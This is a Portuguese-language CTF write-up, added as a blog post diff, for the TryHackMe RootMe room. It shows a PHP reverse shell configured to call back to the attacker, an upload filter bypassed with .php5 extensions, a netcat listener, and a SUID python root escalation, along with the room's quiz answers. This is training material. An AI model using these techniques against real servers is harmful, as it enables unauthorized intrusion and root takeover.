@@ -1,0 +1,158 @@
+---
+title: 'TryHackMe: RootMe CTF Write-Up'
+date: '2024-08-26'
+summary: 'Walkthrough do capture-the-flag RootMe disponível na plataforma TryHackMe.'
+tags: ['hacking', 'capture-the-flag']
+draft: false
+---
+
+[RootMe](https://tryhackme.com/r/room/rrootme) é um CTF de nível fácil desenvolvido por mim e disponível na plataforma TryHackMe. Este CTF tem como objetivo testar suas habilidades em directory fuzzing, upload file bypass e privilege escalation.
+
+<TOCInline toc={props.toc} asDisclosure />
+
+## Reconhecimento
+
+### Port Scan
+
+Vamos começar com uma scan de portas com o NMAP para descobrir quais portas estão abertas e quais serviços estão sendo executados:
+
+```bash
+nmap -sV MACHINE_IP
+```
+
+![NMAP Scan](/static/images/rootme/nmap_scan.png)
+
+**Questão 1:** Quantas portas estão abertas?
+ 
+Resposta: 2
+
+**Questão 2:** Qual versão do Apache está rodando?
+
+Resposta: 2.4.29
+
+**Questão 3:** Qual serviço está rodando na porta 22?
+
+Resposta: SSH
+
+### Directory Fuzzing
+
+Vamos usar o Gobuster para encontrar diretórios e arquivos:
+
+```bash
+gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/common.txt # (Ou sua wordlist de preferência)
+```
+
+![Gobuster Scan](/static/images/rootme/gobuster.png)
+
+**Questão 5:** Qual é o diretório escondido?
+
+Resposta: /*****
+
+Encontramos dois diretórios escondidos, vamos dar uma olhada!
+
+## Exploração
+
+### Upload File Bypass
+
+Acessando o diretório escondido encontramos um formulário de upload de arquivos.
+
+![Upload File](/static/images/rootme/hidden_dir.png)
+
+Agora vamos tentar conseguir o acesso ao servidor enviando uma reverse shell.
+
+Para isso vamos usar a [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell) disponível no github.
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+Edite o arquivo `php-reverse-shell.php` e altere o IP e a porta.
+
+```
+$ip = '127.0.0.1'; // MUDE PARA SEU IP
+$port = 4444; // MUDE PARA SUA PORTA DE PREFERÊNCIA
+```
+
+Após tentar fazer o upload do arquivo, recebemos a seguinte mensagem:
+
+![Upload File Error](/static/images/rootme/upload_error.png)
+
+Não é permitido o envio de arquivos .php.
+
+Uma maneira de contornar este tipo de filtro é usar extensões incomuns como: `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`.
+
+Vamos tentar renomear o arquivo para `php-reverse-shell.php5` e fazer o upload novamente.
+
+![Upload File Success](/static/images/rootme/upload_success.png)
+
+O arquivo foi enviado com sucesso!
+
+Usando o netcat, vamos escutar na porta que configuramos para receber a conexão reversa:
+
+```bash
+nc -lvp 4444
+```
+
+![Netcat](/static/images/rootme/nc_listen.png)
+
+Agora basta abrir o arquivo `php-reverse-shell.php` no navegador e conseguiremos spawnar uma shell.
+
+![Reverse Shell](/static/images/rootme/reverse_shell.png)
+
+**Questão 6:** user.txt
+
+Respota: THM\{*****\} *(Localizada no arquivo /var/www/html/user.txt)*
+
+![User Flag](/static/images/rootme/user_flag.png)
+
+### Privilege Escalation
+
+Agora para escalonar nossos privilégios para root vamos explorar arquivos com permissão SUID. 
+
+Caso queira aprender mais a fundo sobre a falha, leia o artigo que escrevi anteriormente sobre: [SUID Privilege Escalation](/blog/suid-privilege-escalation).
+
+Vamos começar procurando pelos arquivos com a permissão SUID:
+
+```bash
+find / -perm /4000 # Caso queira esconder os erros adicione 2>/dev/null
+```
+
+![SUID Files](/static/images/rootme/suid_files.png)
+
+Encontramos um arquivo suspeito, `/usr/bin/python`.
+
+**Questao 7:** Procure por arquivos com permissão SUID, qual arquivo é estranho?
+
+Resposta: /usr/bin/python
+
+**Questão 8:** Encontre uma forma de escalonar seus privilégios.
+
+O [GTFOBins](https://gtfobins.github.io/) é um *cheat sheet* com várias técnicas de privilege escalation, vamos procurar pelo python.
+
+![GTFOBins](/static/images/rootme/gtfobins.png)
+
+Primeiro, vamos spawnar uma shell TTY com o comando:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+E agora podemos conseguir o acesso ao root através do comando:
+
+```bash
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+![Root Flag](/static/images/rootme/root_shell.png)
+
+**Questão 9:** root.txt
+
+Resposta: THM\{*****\} *(Localizada no arquivo /root/root.txt)*
+
+CTF concluído com sucesso!
+
+## Conclusão
+
+Os CTFs são uma das melhores maneiras de testar suas habilidades em hacking e desenvolver novas técnicas.
+
+Com esta máquina aprendemos sobre directory fuzzing, upload file bypass e privilege escalation. Espero que tenha gostado do desafio!
